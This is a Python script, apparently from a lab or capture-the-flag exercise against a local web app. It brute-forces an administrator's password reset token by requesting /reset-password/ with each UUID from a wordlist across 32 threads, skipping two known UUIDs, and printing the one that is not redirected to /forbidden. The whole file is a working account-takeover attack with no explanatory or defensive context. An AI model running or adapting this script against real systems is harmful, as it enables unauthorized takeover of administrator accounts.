import requests
import threading

# Create a stop event to signal all threads to stop
stop_event = threading.Event()

# Function to process each sublist of UUIDs
def check_uuid_list(uuid_list):
    for uuid in uuid_list:
        if stop_event.is_set():  # Check if other thread has found the token and stopped all threads
            break
        uuid = uuid.rstrip("\n")
        url = f"http://localhost:8000/reset-password/{uuid}"
        response = requests.get(url)
        if response.url != "http://localhost:8000/forbidden" and uuid != "f8dd3ca0-b4ba-11ef-b2cb-5f26c3a0bb3d" and uuid != "f9125660-b4ba-11ef-b2cb-5f26c3a0bb3d":
            print("ResetToken for administrator is: " + uuid)
            stop_event.set()  # Signal all threads to stop
            break

# Read the UUIDs from the file
with open("uuids_list.txt", "r") as f:
    uuids = f.readlines()

# Split the list into 32 smaller lists
split_size = len(uuids) // 32
uuid_lists = [uuids[i:i + split_size] for i in range(0, len(uuids), split_size)]

# Create a list to hold threads
threads = []

# Launch a thread for each sublist
for uuid_list in uuid_lists:
    thread = threading.Thread(target=check_uuid_list, args=(uuid_list,))
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()
